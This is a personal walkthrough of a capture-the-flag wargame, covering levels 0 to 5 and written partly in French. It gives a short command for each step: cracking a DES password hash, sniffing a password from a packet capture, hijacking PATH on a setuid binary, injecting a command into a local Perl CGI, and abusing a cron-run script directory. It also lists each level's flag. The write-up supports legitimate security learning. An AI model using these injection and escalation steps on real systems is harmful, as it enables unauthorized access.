
# level 0
level00:level00

`find / -group "flag00" 2>/dev/null`
```
/usr/sbin/john
/rofs/usr/sbin/john
```
`cat /usr/sbin/john`
```
cdiiddwpgswtgt
```
`su flag00:cdiiddwpgswtgt -> fail`

`dcode.fr -> rot15 -> 	cdiiddwpgswtgt -> NOTTOOHARDHERE`

`su flag00:nottoohardhere`

`getflag`
```
x24ti5gi3x0ol2eh4esiuxias
```
# level 1
su level01:x24ti5gi3x0ol2eh4esiuxias

`cat /etc/passwd`

flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

su flag01:42hDRfypTqqnw -> fail

john the ripper  [DES 128/128 SSE2-16]) -> ```42hDRfypTqqnw :  abcdefg```

su flag01:abcdef

getflag
```
f2av5il02puano7naaf6adaaf
```

# level 02
su level02:f2av5il02puano7naaf6adaaf

level02.pcap open it with wireshark follow tcp stream -> read pwd flag

Password: ft_wandr...NDRel.L0L -> ft_waNDReL0L

getflag-> kooda2puivaav1idi4f57q8iq

# level 03
su level03:kooda2puivaav1idi4f57q8iq
./level03 -> exploit me
ls -l ./level03 a le groupe flag03
en desassemblant le binaire, la string est ecrite comme ceci "/usr/bin/env echo Exploit me"

en utilisant un autre echo on peut appeler getflag et avoir le flag `qi0maab88jeaj46qoumi7maus`


# level 04
fichier perl qui resume le contenu d'un serveur, imprime le contenu de la variable x
curl "http://127.0.0.1:4747/?x=\$(getflag)"
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

# level 5

you have new mail in /var/mail/level05

find / -group flag05 2>/dev/null

cat /usr/sbin/openarenaserver 

echo 'getflag > /tmp/coucou' > /opt/openarenaserver/coucou


watch cat /tmp/coucou -> viuaaale9huek52boumoomioc


# level 6







